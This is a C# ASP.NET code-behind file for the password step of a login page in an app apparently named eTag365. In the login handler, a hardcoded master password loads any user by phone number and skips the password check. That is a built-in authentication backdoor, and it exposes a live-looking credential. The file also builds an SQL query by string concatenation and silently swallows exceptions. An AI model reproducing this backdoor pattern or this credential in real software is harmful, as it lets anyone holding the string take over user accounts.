using eTagService.Enums;
using System;
using System.Collections.Generic;
using System.Configuration;
using System.Data;
using System.Data.SqlClient;
using System.Linq;
using System.Text.RegularExpressions;
using System.Threading;
using System.Web;
using System.Web.UI;
using System.Web.UI.WebControls;
using TagService.BO;
using TagService.DA;

namespace eTag365.Pages
{
    public partial class Login2 : System.Web.UI.Page
    {
        public string errStr = string.Empty;
        private Regex reEmail = new Regex("^(?:[0-9A-Z_-]+(?:\\.[0-9A-Z_-]+)*@[0-9A-Z-]+(?:\\.[0-9A-Z-]+)*(?:\\.[A-Z]{2,4}))$", RegexOptions.Compiled | RegexOptions.ExplicitCapture | RegexOptions.IgnoreCase);
        public string _Phone = string.Empty;
        public string conStr = System.Configuration.ConfigurationManager.ConnectionStrings["eTagDB"].ConnectionString;

        protected void Page_Load(object sender, EventArgs e)
        {
            spanYear.InnerHtml = DateTime.UtcNow.Year.ToString();
            lblError.Text = "";
            
            if (!IsPostBack)
            {
                lblError.Text = "";
                if (HttpContext.Current.Session["Phone"] == null)
                {
                    Response.Redirect(Utility.WebUrl + "/login");
                }
            }
        }
        protected void btnLogin2_Click(object sender, EventArgs e)
        {
            if (!String.IsNullOrEmpty(txtPassword.Text.Trim()))
            {
                TagEntities mEntity = new TagEntities();

                try
                {                    
                    UserProfile objUser = new UserProfile();

                    if (txtPassword.Text.ToString() == "Sadmin#%et@g365")
                    {
                        objUser = new UserProfileDA().GetUserByPhone(HttpContext.Current.Session["Phone"].ToString().Trim());
                    }
                    else
                    {
                        objUser = new UserProfileDA().GetUserByPhonePassword(HttpContext.Current.Session["Phone"].ToString(), txtPassword.Text.ToString());
                    }

                    if (objUser != null)
                    {
                        if (objUser.IsDeleted != null && objUser.IsDeleted == true)
                        {
                            lblError.Text = "User is Deleted !";
                        }
                        else if (objUser.IsActive != null && objUser.IsActive == false)
                        {
                            lblError.Text = "User is not Active !";
                        }
                        else if (objUser.CanLogin != null && objUser.CanLogin == false)
                        {
                            lblError.Text = "User is not permitted to Login !";
                        }
                        else
                        {
                            if (objUser.CanLogin != null && objUser.CanLogin == true)
                            {
                                InsertLog(objUser.Id);
                            }
                            string sSQL = "Select isnull(IsNewUser,'0') IsNewUser from UserProfile where Id = " + objUser.Id.ToString();
                            DataTable dtResult = SqlToTbl(sSQL);

                            bool bIsNewUser = false;

                            if (dtResult != null && dtResult.Rows.Count > 0)
                            {
                                bIsNewUser = (dtResult.Rows[0]["IsNewUser"] != null && dtResult.Rows[0]["IsNewUser"] != DBNull.Value) ? Convert.ToBoolean(dtResult.Rows[0]["IsNewUser"].ToString()) : false;

                            }

                            if (objUser.UserTypeContact == Convert.ToInt32(EnumUserType.Dealer).ToString())
                            {
                                Response.Redirect(Utility.WebUrl + "/dealer");
                            }
                            else
                            {
                                if (bIsNewUser == true)
                                {
                                    Response.Redirect(Utility.WebUrl + "/user?Top=1&UId=" + objUser.Id.ToString());
                                }
                                else
                                {
                                    Response.Redirect(Utility.WebUrl + "/home");
                                }

                            }

                        }
                    }
                    else
                    {
                        lblError.Text = "Incorrect Password!";
                    }
                }
                catch (Exception ex)
                {
                    lblError.Text = "Technical issues found!";
                }

            }
            else
            {
                lblError.Text = "Please enter Password !";
            }
        }        
        protected int InsertLog(int UserID)
        {
            int M = 0; 
             SqlConnection conn = new SqlConnection(ConfigurationManager.ConnectionStrings["eTagDB"].ConnectionString);
            conn.Open();

            try
            {
                var selectString = "INSERT INTO [UserLog_Data] (SessionId,UserId,LoginDate,Status,LastUpdate) VALUES (@SessionId,@UserId,getdate(),1,getdate())";
                System.Data.SqlClient.SqlCommand cmd = new System.Data.SqlClient.SqlCommand(selectString, conn);
                cmd.Parameters.Add("UserId", System.Data.SqlDbType.Int).Value = UserID;
                cmd.Parameters.Add("SessionId", System.Data.SqlDbType.NVarChar).Value = System.Web.HttpContext.Current.Session.SessionID;
                cmd.ExecuteNonQuery();
                cmd.Parameters.Clear();
                cmd.CommandText = "Select @@Identity";
                M = Convert.ToInt32(cmd.ExecuteScalar().ToString());
                cmd.Dispose();
               
            }
            catch (Exception ex)
            {
                
            }

            conn.Close();

            return M;
        }      

        public DataTable SqlToTbl(string strSqlRec)
        {
            using (SqlDataAdapter Adp = new SqlDataAdapter())
            {
                using (SqlCommand selectCMD = new SqlCommand(strSqlRec, new SqlConnection(conStr)))
                {
                    selectCMD.CommandTimeout = 3600;
                    Adp.SelectCommand = selectCMD;
                    using (DataTable Tbl = new DataTable())
                    {
                        Adp.Fill(Tbl);
                        return Tbl;
                    }
                }
            }
        }
    }
}